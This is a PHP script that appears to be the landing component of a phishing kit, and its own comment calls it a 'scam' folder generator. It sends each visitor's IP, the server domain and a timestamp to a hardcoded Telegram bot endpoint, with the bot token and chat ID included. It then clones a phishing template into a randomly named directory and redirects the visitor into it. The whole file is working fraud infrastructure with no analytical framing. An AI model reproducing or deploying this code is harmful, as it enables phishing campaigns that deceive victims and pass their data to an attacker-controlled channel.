<?php
session_start();
error_reporting(0);
include 'get_ip.php'; 
$ip = $_SERVER['REMOTE_ADDR'];
$TIME_DATE =   date("Y/m/d") . " " . date("h:i:sa");
//------------------------------------------||  ANTIBOTS  ||-----------------------------------------------------//

$cc = "DOMAIN : ".$_SERVER['SERVER_NAME']."\nIP : ".$ip."\nTIME : ".$TIME_DATE;


function Vist($cc) {
	
    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1999914993:AAG-q8eldV5fSg5UcNabYpuIaq6-7jLFcwM/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=1669634398&text=".$cc."");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);

}

Vist($cc);
//---------------------------------------------------------------------------------------------------------------//
// Create User FOLDER SCAM !
for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./BIbAZTGkMv4".$DIR;
$DST10_="BIbAZTGkMv4";
function recurse_copy($DST10_,$DIR) {
$dir = opendir($DST10_);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($DST10_ . '/' . $file) ) {
recurse_copy($DST10_ . '/' . $file,$DIR . '/' . $file);
}
else {
copy($DST10_ . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $DST10_, $DIR );
#END
//LOCATION !
header("LOCATION: ".$DIR."");
?>

